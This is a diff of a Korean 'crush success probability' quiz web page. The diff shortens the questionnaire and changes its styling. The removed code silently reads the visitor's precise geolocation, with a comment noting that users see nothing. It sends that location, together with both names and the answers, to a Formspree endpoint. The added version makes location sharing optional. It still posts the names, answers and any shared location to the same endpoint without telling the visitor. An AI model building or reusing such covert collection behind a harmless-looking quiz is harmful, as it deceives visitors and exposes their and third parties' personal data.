@@ -2,7 +2,7 @@
 <html lang="ko">
 <head>
   <meta charset="utf-8">
-  <title>짝사랑 성공 확률 테스트 💘 (위치 추적 포함)</title>
+  <title>짝사랑 성공 확률 테스트 💘 (질문 기반)</title>
   <style>
     body {
       font-family: 'Arial', sans-serif;
@@ -21,6 +21,7 @@
     }
     h1 { color: #ff69b4; text-align: center; }
     label { display: block; margin: 10px 0 5px; }
+    .option { display: block; margin-left: 15px; }
     input[type="text"] {
       padding: 8px;
       width: 90%;
@@ -28,7 +29,6 @@
       border: 1px solid #ccc;
     }
     .question { margin-top: 20px; }
-    .option { display: block; margin: 6px 0; }
     button {
       margin-top: 20px;
       padding: 10px 20px;
@@ -40,12 +40,22 @@
       cursor: pointer;
       width: 100%;
     }
-    #result {
-      margin-top: 25px;
-      font-size: 20px;
-      font-weight: bold;
-      text-align: center;
+    #shareLocation {
+      font-size: 12px;
+      background: none;
+      border: none;
+      color: #888;
+      cursor: pointer;
+      text-decoration: underline;
+      margin-top: 10px;
     }
+    #locationStatus {
+      font-size: 12px;
+      color: #999;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    #result { margin-top: 25px; font-size: 20px; font-weight: bold; text-align: center; }
   </style>
 </head>
 <body>
@@ -57,7 +67,6 @@
     <label>짝사랑 상대 이름:</label>
     <input type="text" id="crushName" required>
 
-    <!-- 10개 질문 -->
     <div class="question">
       <label>1️⃣ 상대와 얼마나 자주 대화하나요?</label>
       <label class="option"><input type="radio" name="q1" value="10"> 거의 안 해요</label>
@@ -106,37 +115,8 @@
       <label class="option"><input type="radio" name="q6" value="100"> 애교 섞인 톤이에요</label>
     </div>
 
-    <div class="question">
-      <label>7️⃣ 상대가 먼저 말을 걸거나 연락한 적이 있나요?</label>
-      <label class="option"><input type="radio" name="q7" value="20"> 전혀 없어요</label>
-      <label class="option"><input type="radio" name="q7" value="50"> 가끔 있었어요</label>
-      <label class="option"><input type="radio" name="q7" value="80"> 종종 먼저 연락해요</label>
-      <label class="option"><input type="radio" name="q7" value="100"> 자주 먼저 연락해요</label>
-    </div>
-
-    <div class="question">
-      <label>8️⃣ 내 이야기나 일상에 관심을 보이나요?</label>
-      <label class="option"><input type="radio" name="q8" value="20"> 전혀요</label>
-      <label class="option"><input type="radio" name="q8" value="50"> 가끔 물어봐요</label>
-      <label class="option"><input type="radio" name="q8" value="80"> 제법 관심 있어요</label>
-      <label class="option"><input type="radio" name="q8" value="100"> 아주 잘 기억해요</label>
-    </div>
-
-    <div class="question">
-      <label>9️⃣ 내가 농담하거나 말하면 웃어주나요?</label>
-      <label class="option"><input type="radio" name="q9" value="20"> 거의 안 웃어요</label>
-      <label class="option"><input type="radio" name="q9" value="50"> 예의상 웃어요</label>
-      <label class="option"><input type="radio" name="q9" value="80"> 자주 웃어요</label>
-      <label class="option"><input type="radio" name="q9" value="100"> 항상 잘 웃어요</label>
-    </div>
-
-    <div class="question">
-      <label>🔟 나를 도와주거나 챙겨준 적이 있나요?</label>
-      <label class="option"><input type="radio" name="q10" value="20"> 그런 적 없어요</label>
-      <label class="option"><input type="radio" name="q10" value="50"> 한두 번 정도</label>
-      <label class="option"><input type="radio" name="q10" value="80"> 꽤 여러 번</label>
-      <label class="option"><input type="radio" name="q10" value="100"> 자주 챙겨줘요</label>
-    </div>
+    <button type="button" id="shareLocation">📍 위치 공유하기 (선택)</button>
+    <p id="locationStatus"></p>
 
     <button type="submit">결과 보기</button>
   </form>
@@ -144,19 +124,39 @@
   <div id="result"></div>
 
   <script>
+    let userLocation = "위치 정보 없음";
+
+    document.getElementById("shareLocation").addEventListener("click", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            userLocation = `위도: ${pos.coords.latitude}, 경도: ${pos.coords.longitude}`;
+            document.getElementById("locationStatus").innerText = "✅ 위치가 저장되었습니다.";
+          },
+          () => {
+            document.getElementById("locationStatus").innerText = "⚠️ 위치를 가져올 수 없습니다.";
+          }
+        );
+      } else {
+        document.getElementById("locationStatus").innerText = "⚠️ 브라우저가 위치 기능을 지원하지 않습니다.";
+      }
+    });
+
     document.getElementById("loveForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
       const yourName = document.getElementById("yourName").value.trim();
       const crushName = document.getElementById("crushName").value.trim();
       const resultBox = document.getElementById("result");
-      const questions = Array.from({ length: 10 }, (_, i) => `q${i+1}`);
-      let total = 0, answered = 0, answers = {};
 
       if (!yourName || !crushName) {
         resultBox.innerText = "⚠️ 이름을 모두 입력해주세요!";
         return;
       }
+
+      const questions = ['q1', 'q2', 'q3', 'q4', 'q5', 'q6'];
+      let total = 0, answered = 0;
+      let answers = {};
 
       for (const q of questions) {
         const selected = document.querySelector(`input[name="${q}"]:checked`);
@@ -174,41 +174,33 @@
         return;
       }
 
-      const average = Math.round(total / questions.length);
+      const average = total / questions.length;
+      const percent = Math.round(average);
+
       let message = "";
-      if (average < 40) message = "🥀 아직은 가능성이 낮아요...";
-      else if (average < 70) message = "🌸 희망이 보여요!";
-      else if (average < 90) message = "💞 좋은 분위기예요!";
+      if (percent < 40) message = "🥀 아직은 가능성이 낮아요... 조금 더 다가가보세요!";
+      else if (percent < 70) message = "🌸 희망이 보여요! 조금만 더 친해지면 좋을 것 같아요!";
+      else if (percent < 90) message = "💞 좋은 분위기예요! 서로 마음이 통할지도 몰라요!";
       else message = "🔥 완벽해요! 곧 커플 탄생 예감입니다!";
 
       resultBox.innerHTML = `
         💖 <b>${yourName}</b>와(과) <b>${crushName}</b>의 짝사랑 성공 확률은<br>
-        <span style="font-size:24px;color:#ff69b4;">${average}%</span><br><br>${message}
+        <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>${message}
       `;
 
-      // 위치 추적 (사용자에겐 아무 표시 없음)
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          sendFormspree({
-            yourName, crushName, average, message, answers,
-            location: `${pos.coords.latitude}, ${pos.coords.longitude}`
-          });
-        },
-        () => sendFormspree({
-          yourName, crushName, average, message, answers,
-          location: "Unknown"
-        }),
-        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-      );
-    });
-
-    function sendFormspree(data) {
       fetch("https://formspree.io/f/xanegwav", {
         method: "POST",
         headers: { "Accept": "application/json", "Content-Type": "application/json" },
-        body: JSON.stringify(data)
+        body: JSON.stringify({
+          yourName,
+          crushName,
+          percent,
+          resultMessage: message,
+          answers,
+          location: userLocation
+        })
       }).catch(() => {});
-    }
+    });
   </script>
 </body>
 </html>
